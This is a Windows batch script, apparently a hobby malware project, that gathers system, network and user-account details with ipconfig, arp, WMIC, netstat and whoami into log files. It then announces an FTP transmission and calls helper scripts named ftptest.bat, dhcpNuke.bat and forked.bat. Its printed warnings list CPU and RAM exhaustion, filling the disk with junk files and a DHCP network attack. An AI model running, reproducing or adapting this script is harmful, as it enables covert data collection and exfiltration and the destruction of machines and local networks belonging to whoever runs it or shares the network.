@echo off
setlocal enabledelayedexpansion
echo Program developed by > Discovery.txt
echo Cyrus Majd>> Discovery.txt
echo In contribution to >> Discovery.txt
echo ~ =============================================== ~ >> Discovery.txt
echo ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ` >> Discovery.txt
echo ` #     # #     #  #####   #####   #####  ####### ` >> Discovery.txt
echo ` #     # #     # #     # #     # #     #    #    ` >> Discovery.txt
echo ` #     # #     # #       #       #          #    ` >> Discovery.txt
echo ` ####### #######  #####  #        #####     #    ` >> Discovery.txt
echo ` #     # #     #       # #             #    #    ` >> Discovery.txt
echo ` #     # #     # #     # #     # #     #    #    ` >> Discovery.txt
echo ` #     # #     #  #####   #####   #####     #    ` >> Discovery.txt
echo ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ` >> Discovery.txt
echo ~ =============================================== ~ >> Discovery.txt
echo -------------------------------------------------- >> Discovery.txt
echo STARTING PHASE 1 >> Discovery.txt
echo .................................................. >> Discovery.txt
echo Factorial Time Logs: >> Discovery.txt

for /l %%G in (0,1,10) do (
    set /a n=%%G
) & call :Factorial !n! & echo %%G^^! = !_Factorial!

echo -------------------------------------------------- >> Discovery.txt
echo STARTING PHASE 2 >> Discovery.txt
echo .................................................. >> Discovery.txt
echo The following are the results from an ipconfig scan    >> Discovery.txt
ipconfig /all >> Discovery.txt 
echo .................................................. >> Discovery.txt
echo These are the results from a regular ARP scan      >> Discovery.txt
arp -a >> Discovery.txt
echo -------------------------------------------------- >> Discovery.txt
echo STARTING PHASE 3 >> Discovery.txt
echo .................................................. >> Discovery.txt
echo The results of several WMIC scans will now be appended to file "wmicLog"  >> Discovery.txt
WMIC OS Get /Format:htable > wmicLog.htm
WMIC CPU Get /Format:htable >> wmicLog.htm
WMIC NIC Get /Format:htable >> wmicLog.htm
WMIC bios Get /Format:htable >> wmicLog.htm
WMIC BOOTCONFIG Get /Format:htable >> wmicLog.htm
WMIC computersystem Get /Format:htable >> wmicLog.htm
WMIC nicconfig Get /Format:htable >> wmicLog.htm
WMIC useraccount list full /Format:htable >> wmicLog.htm
WMIC logicaldisk get description, filesystem, name /Format:htable >> wmicLog.htm
echo Done! >> Discovery.txt
echo Here are all avaiable ports: >> wmicLog.htm
netstat -an >> Discovery.txt
echo Here are all TCP and UDP connections going through this computer: >> Discovery.txt
netstat -a -o >> Discovery.txt
echo More user account information: >> Discovery.txt
whoami /all >> Discovery.txt
echo -------------------------------------------------- >> Discovery.txt
echo STARTING PHASE 4 >> Discovery.txt
echo .................................................. >> Discovery.txt
echo WARNING: THE STAGE THAT WILL BE ACTIVATED AFTER TRANSMISSION IS DANGEROUS. IF YOU PROCEED, THERE IS NO TURNING BACK. >> Discovery.txt
echo THE FOLLOWING ATTACKS WILL BE EXECUTED UPON TRANSMISSION COMPLETION >> Discovery.txt
echo A. CPU OVERFLOW >> Discovery.txt
echo B. RAM OVERFLOW >> Discovery.txt
echo C. AN OUTRAGEOUSLY LARGE QUANTITY OF JUNK TXT FILES >> Discovery.txt
echo D. HARD DRIVE OVERWRITING BY THE OUTRAGEOUSLY LARGE QUANTITY OF JUNK TXT FILES >> Discovery.txt
echo E. DHCP NETWORK ATTACK THAT WILL GET YOU BANNED BY YOUR ROUTER >> Discovery.txt
echo -~*=have fun=*~- >> Discovery.txt
echo .,.,.,.,.,.,.Transmitting Log Files To FTP Server,.,.,.,.,.,., >> Discovery.txt
echo .,.,.,.,.,.,.Transmission Successful,.,.,.,.,.,., >> Discovery.txt

echo .,.,.,.,.,.,.Initiating Phase 5,.,.,.,.,.,., >> Discovery.txt
call ftptest.bat
echo --------------------------------------------------
echo STARTING PHASE 5
echo ..................................................
call dhcpNuke.bat
echo --------------------------------------------------
echo STARTING PHASE 6
echo ..................................................
call forked.bat

pause & goto :eof
:Factorial
echo %time% >> Discovery.txt & echo %/b% >> Discovery.txt
set _Factorial=1
call :calc_factorial %1 & goto :eof
    :calc_factorial
    set /a num=%1
    if %num% gtr 1 (
        set /a _Factorial*=!num!
        
        call :calc_factorial !num!-1
 endlocal
    )

goto :eof

